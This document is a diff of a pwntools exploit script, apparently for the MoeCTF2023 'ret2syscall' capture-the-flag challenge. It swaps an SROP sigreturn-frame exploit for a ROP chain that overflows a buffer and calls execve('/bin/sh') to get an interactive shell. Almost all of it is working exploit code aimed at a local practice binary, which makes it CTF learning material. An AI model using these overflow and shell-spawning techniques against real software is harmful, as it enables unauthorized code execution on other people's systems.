@@ -1,31 +1,19 @@
-"""
-frame.rax = 0x3b            # syscall number for execve
-frame.rdi = BINSH           # pointer to /bin/sh
-frame.rsi = 0x0             # NULL
-frame.rdx = 0x0             # NULL
-"""
-
+# MoeCTF2023 ret2syscall
 from pwn import *
 
-elf = context.binary = ELF('./vuln', checksec=False)
-p = process()
+warnings.filterwarnings("ignore", category=BytesWarning)
 
-BINSH = elf.address + 0x1250
-POP_RAX = 0x41018
-SYSCALL_RET = 0x41015
+s = process('./ret2syscall')
+# s = remote('localhost',33817)
+elf = ELF('./ret2syscall', checksec=False)
+context(log_level='debug', arch='amd64', os='linux')
 
-frame = SigreturnFrame()
-frame.rax = 0x3b            # syscall number for execve
-frame.rdi = BINSH           # pointer to /bin/sh
-frame.rsi = 0x0             # NULL
-frame.rdx = 0x0             # NULL
-frame.rip = SYSCALL_RET
+pop_rax = 0x40117e
+pop_rdi = 0x401180
+pop_rsi_rdx = 0x401182
+syscall_addr = 0x401185
+binsh_addr = 0x404040
+payload = flat('a' * (64 + 8), pop_rax, 59, pop_rdi, binsh_addr, pop_rsi_rdx, 0, 0, syscall_addr, 0)
 
-payload = b'A' * 8
-payload += p64(POP_RAX)
-payload += p64(0xf)
-payload += p64(SYSCALL_RET)
-payload += bytes(frame)
-
-p.sendline(payload)
-p.interactive()
+s.sendafter('all?', payload)
+s.interactive()
